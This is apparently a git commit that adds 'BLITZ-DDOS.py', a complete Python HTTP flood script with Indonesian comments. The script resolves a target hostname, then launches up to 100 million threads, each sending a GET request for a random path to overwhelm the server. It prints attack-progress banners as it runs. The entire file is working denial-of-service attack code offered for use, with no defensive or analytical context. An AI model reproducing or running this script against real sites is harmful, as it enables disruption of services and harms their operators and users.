b7c0c23a06181a85c65e06f5b5a4d89204ad4ad6
KunFay99 <kaffayukiffu@gmail.com>
2024-10-29 10:11:37 +0700

    Create BLITZ-DDOS.py

---
+++ BLITZ-DDOS.py
@@ -0,0 +1,97 @@
+# -*- coding: utf-8 -*-
+
+import random
+import socket
+import string
+import sys
+import threading
+import time
+
+# Parse inputs
+host = ""
+ip = ""
+port = 0
+num_requests = 0
+
+if len(sys.argv) == 2:
+    port = 80
+    num_requests = 100000000
+elif len(sys.argv) == 3:
+    port = int(sys.argv[2])
+    num_requests = 100000000
+elif len(sys.argv) == 4:
+    port = int(sys.argv[2])
+    num_requests = int(sys.argv[3])
+else:
+    print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
+    sys.exit(1)
+
+# Ubah FQDN ke IP
+try:
+    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
+    ip = socket.gethostbyname(host)
+except socket.gaierror:
+    print (" ERROR\n Make sure you entered a correct website")
+    sys.exit(2)
+
+# Buat variabel bersama untuk jumlah utas
+thread_num = 0
+thread_num_mutex = threading.Lock()
+
+
+# print status utas
+def print_status():
+    global thread_num
+    thread_num_mutex.acquire(True)
+
+    thread_num += 1
+    #print output pada baris yang sama
+    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
+    sys.stdout.flush()
+    thread_num_mutex.release()
+
+
+# Hasilkan Jalur URL
+def generate_url_path():
+    msg = str(string.ascii_letters + string.digits + string.punctuation)
+    data = "".join(random.sample(msg, 5))
+    return data
+
+
+# Lakukan permintaan
+def attack():
+    print_status()
+    url_path = generate_url_path()
+
+    # Buat soket mentah
+    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        # Buka koneksi pada soket mentah tsb
+        dos.connect((ip, port))
+
+        # Kirim permintaan sesuai spesifikasi HTTP
+        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
+        dos.send(byt)
+    except socket.error:
+        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
+    finally:
+        # Tutup soket dengan rapi
+        dos.shutdown(socket.SHUT_RDWR)
+        dos.close()
+
+
+print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
+
+# Memunculkan thread per permintaan
+all_threads = []
+for i in range(num_requests):
+    t1 = threading.Thread(target=attack)
+    t1.start()
+    all_threads.append(t1)
+
+    # Adjusting this sleep time will affect requests per second
+    time.sleep(0.01)
+
+for current_thread in all_threads:
+    current_thread.join()  # Jadikan thread utama menunggu cabang thread 
